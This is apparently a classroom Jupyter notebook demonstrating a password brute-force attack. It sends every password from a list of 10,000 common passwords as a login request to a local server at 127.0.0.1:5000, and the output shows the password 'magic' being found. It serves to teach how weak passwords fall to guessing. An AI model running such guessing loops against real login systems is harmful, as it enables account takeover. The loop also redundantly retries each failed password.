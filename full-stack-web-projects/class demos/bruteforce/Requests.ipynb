{
 "nbformat": 4,
 "nbformat_minor": 0,
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  },
  "colab": {
   "name": "Requests.ipynb",
   "provenance": []
  }
 },
 "cells": [
  {
   "cell_type": "code",
   "metadata": {
    "editable": true,
    "id": "z_3XEX23Y31B",
    "colab_type": "code",
    "colab": {},
    "outputId": "86efae97-0423-4c07-aeab-3dfb08fd9083"
   },
   "source": [
    "# This method can be used to send a login post \n",
    "# request to our server\n",
    "# returns True if 200 success on login attempt\n",
    "# returns False otherwise (failure, errors)\n",
    "\n",
    "import requests\n",
    "def try_password(password, print_all=False):\n",
    "    # specify where to make the request\n",
    "    url = 'http://127.0.0.1:5000/login'\n",
    "    \n",
    "    # define the payload for the post request\n",
    "    payload = {'password': password}\n",
    "    \n",
    "    # make the request\n",
    "    r = requests.post(url, json=payload)\n",
    "    \n",
    "    # print some results (http status code)\n",
    "    if print_all:\n",
    "        print(payload['password'] + \":\" + str(r.status_code))\n",
    "    \n",
    "    # determine if we've gained access 200 = success!\n",
    "    if r.status_code == 200:\n",
    "        print(\"the password is: \" + payload['password'])\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "try_password('kitten')"
   ],
   "execution_count": null,
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "metadata": {
      "tags": []
     },
     "execution_count": 1
    }
   ]
  },
  {
   "cell_type": "code",
   "metadata": {
    "editable": true,
    "id": "wWP73i0zY31H",
    "colab_type": "code",
    "colab": {},
    "outputId": "5e7d42d7-2000-45e1-9e86-1e9824fcd14a"
   },
   "source": [
    "# Load the NIST list of 10,000 most commonly used passwords (strings)\n",
    "with open('nist_10000.txt', newline='') as bad_passwords:\n",
    "    nist_bad = bad_passwords.read().split('\\n')\n",
    "print(nist_bad[1:10])"
   ],
   "execution_count": null,
   "outputs": [
    {
     "output_type": "stream",
     "text": [
      "['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567']\n"
     ],
     "name": "stdout"
    }
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "editable": true,
    "id": "hlOTH7n9Y31M",
    "colab_type": "text",
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "# Your Task!\n",
    "## Make a request for each password in the nist_bad password list. \n",
    "> Tip: End the loop on a successful response (200)"
   ]
  },
  {
   "cell_type": "code",
   "metadata": {
    "id": "32rP5N6vY31J",
    "colab_type": "code",
    "colab": {},
    "outputId": "7653fed9-12d0-40b4-d116-e612de94a54f",
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "source": [
    "for password in nist_bad:\n",
    "    if try_password(password):\n",
    "        break\n",
    "    else:\n",
    "        try_password(password)"
   ],
   "execution_count": null,
   "outputs": [
    {
     "output_type": "stream",
     "text": [
      "the password is: magic\n"
     ],
     "name": "stdout"
    }
   ]
  }
 ]
}